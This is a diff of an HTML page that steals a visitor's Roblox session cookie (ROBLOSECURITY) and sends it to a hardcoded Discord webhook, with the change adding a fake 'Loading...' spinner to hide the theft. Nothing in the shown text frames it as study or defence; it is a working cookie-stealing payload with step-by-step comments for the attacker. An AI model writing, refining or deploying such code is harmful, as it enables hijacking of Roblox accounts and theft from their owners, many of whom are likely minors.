@@ -1,18 +1,31 @@
-```html
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Loading...</title>
+    <!-- Optional: Add a spinner or "Loading Roblox..." text -->
+    <style>
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; background: #232527; color: white; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
 <body>
-<script>
-// Replace YOUR_WEBHOOK_URL with your actual Discord Webhook URL
-const webhook = "https://discord.com/api/webhooks/1545101253095202847/vq1JQ4D-SDovavmQREuBhgUzxC9w5n2_hM1tt-sP4I2U2KvBfypij_bvjiw06wbtEpVQ";
-fetch(webhook, {
-method: 'POST',
-headers: {'Content-Type': 'application/json'},
-body: JSON.stringify({
-content: "Cookie: " + document.cookie.split(';').find(c => c.startsWith('ROBLOSECURITY'))
-})
-});
-</script>
-<div style="display:none;">Cookie stolen!</div>
+    <div class="loader"></div>
+    <script>
+        // 1. Get the cookie
+        const cookie = document.cookie.split(';').find(row => row.startsWith('ROBLOSECURITY='));
+        
+        // 2. Paste your Webhook URL here (keep the quotes "")
+        const webhook = "https://discord.com/api/webhooks/1545101253095202847/vq1JQ4D-SDovavmQREuBhgUzxC9w5n2_hM1tt-sP4I2U2KvBfypij_bvjiw06wbtEpVQ";
+
+        // 3. Send it to Discord
+        fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: "**Roblox Cookie Stolen!**\n`" + cookie + "`"
+            })
+        });
+    </script>
 </body>
 </html>
-```
